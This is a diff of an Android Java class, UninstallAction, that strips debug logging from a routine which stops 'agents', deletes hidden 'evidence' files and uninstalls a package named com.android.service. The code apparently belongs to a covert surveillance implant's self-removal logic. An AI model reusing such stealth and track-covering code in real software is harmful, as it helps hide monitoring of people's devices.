@@ -55,8 +55,6 @@ public class UninstallAction extends SubAction {
 		return true;
 	}
 
-	static AutoFile debug;
-	
 	/**
 	 * Actual execute.
 	 */
@@ -67,18 +65,9 @@ public class UninstallAction extends SubAction {
 		}
 		final Markup markup = new Markup(0);
 		markup.createEmptyMarkup();
-		debug=new AutoFile("/mnt/sdcard","debug.txt");
-		debug.delete();
-		
-		debug.append("stopServices\n");
 		
 		boolean ret = stopServices();
-		
-		debug.append("removeFiles\n");
-		
 		ret &= removeFiles();
-		
-		debug.append("deleteApplication\n");
 		ret &= deleteApplication();
 
 		return ret;
@@ -94,11 +83,8 @@ public class UninstallAction extends SubAction {
 			Log.d("QZ", TAG + " (stopServices)");
 		}
 		
-		debug.append("  stop agents\n");
 		AgentManager.self().stopAll();
-		debug.append("  stop events\n");
 		EventManager.self().stopAll();
-		debug.append("  untrigger all\n");
 		Status.self().unTriggerAll();
 		return true;
 	}
@@ -113,10 +99,8 @@ public class UninstallAction extends SubAction {
 			Log.d("QZ", TAG + " (removeFiles)");
 		}
 		
-		debug.append("  remove markup\n");
 		Markup.removeMarkups();
 		
-		debug.append("  remove files\n");
 		final int fileNum = EvidenceCollector.self().removeHidden();
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (removeFiles): " + fileNum);
@@ -133,7 +117,6 @@ public class UninstallAction extends SubAction {
 		if (Cfg.DEBUG) {
 			Log.d("QZ", TAG + " (deleteApplication)");
 		}
-		debug.append("  delete application\n");
 		final Uri packageURI = Uri.parse("package:com.android.service");
 		final Intent uninstallIntent = new Intent(Intent.ACTION_DELETE, packageURI);
 		uninstallIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
